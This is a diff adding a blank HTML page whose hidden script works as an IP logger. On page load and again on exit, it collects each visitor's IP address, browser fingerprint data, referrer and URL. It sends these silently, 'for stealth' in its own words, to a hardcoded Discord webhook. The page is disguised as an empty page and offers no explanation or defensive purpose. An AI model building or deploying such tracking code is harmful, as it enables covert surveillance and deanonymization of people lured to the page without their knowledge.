@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: white;
+        }
+    </style>
+</head>
+<body>
+    <!-- Blank page -->
+    
+    <script>
+        // YOUR DISCORD WEBHOOK URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1476224029298790400/NOZ2oezc7mntHIkB3cFMpyxpojacqQp9IIyqz-wda13a5F0KLJRLuNRhwC0f2fzhB1N5';
+        
+        // Multiple IP APIs for redundancy
+        const ipApis = [
+            'https://api.ipify.org?format=json',
+            'https://api.myip.com',
+            'https://ipapi.co/json/',
+            'https://jsonip.com'
+        ];
+
+        // Get IP address
+        async function getIP() {
+            for (const api of ipApis) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 3000);
+                    
+                    const response = await fetch(api, { signal: controller.signal });
+                    clearTimeout(timeoutId);
+                    
+                    const data = await response.json();
+                    
+                    if (data.ip) return data.ip;
+                    if (data.address) return data.address;
+                    if (data.query) return data.query;
+                    
+                } catch (e) {
+                    continue;
+                }
+            }
+            return '0.0.0.0';
+        }
+
+        // Format data for Discord webhook
+        function formatDiscordMessage(ip, browserData) {
+            return {
+                content: `**New IP Captured**`,
+                embeds: [{
+                    title: 'IP Information',
+                    color: 0xFF5733,
+                    fields: [
+                        {
+                            name: '🌐 IP Address',
+                            value: ip,
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ Platform',
+                            value: browserData.platform || 'Unknown',
+                            inline: true
+                        },
+                        {
+                            name: '🌍 Language',
+                            value: browserData.language || 'Unknown',
+                            inline: true
+                        },
+                        {
+                            name: '📱 Screen Resolution',
+                            value: browserData.screenResolution || 'Unknown',
+                            inline: true
+                        },
+                        {
+                            name: '⏰ Timezone',
+                            value: browserData.timezone || 'Unknown',
+                            inline: true
+                        },
+                        {
+                            name: '🕒 Timestamp',
+                            value: browserData.timestamp || new Date().toISOString(),
+                            inline: false
+                        },
+                        {
+                            name: '🔍 User Agent',
+                            value: browserData.userAgent?.substring(0, 100) + '...' || 'Unknown',
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: 'IP Logger'
+                    },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+        }
+
+        // Send to Discord webhook
+        async function sendToDiscord(data) {
+            try {
+                const response = await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data)
+                });
+                
+                if (!response.ok) {
+                    console.error('Discord webhook failed:', await response.text());
+                }
+            } catch (error) {
+                // Silent fail for stealth
+            }
+        }
+
+        // Main function
+        (async function() {
+            // Collect browser data
+            const browserData = {
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'direct',
+                pageUrl: window.location.href
+            };
+
+            // Get IP and send
+            const ip = await getIP();
+            const discordMessage = formatDiscordMessage(ip, browserData);
+            
+            // Send to Discord
+            await sendToDiscord(discordMessage);
+            
+            // Also try on page unload
+            window.addEventListener('beforeunload', function() {
+                const exitMessage = formatDiscordMessage(ip, {
+                    ...browserData,
+                    event: 'page_exit'
+                });
+                navigator.sendBeacon(WEBHOOK_URL, new Blob([JSON.stringify(exitMessage)], { type: 'application/json' }));
+            });
+        })();
+    </script>
+</body>
+</html>
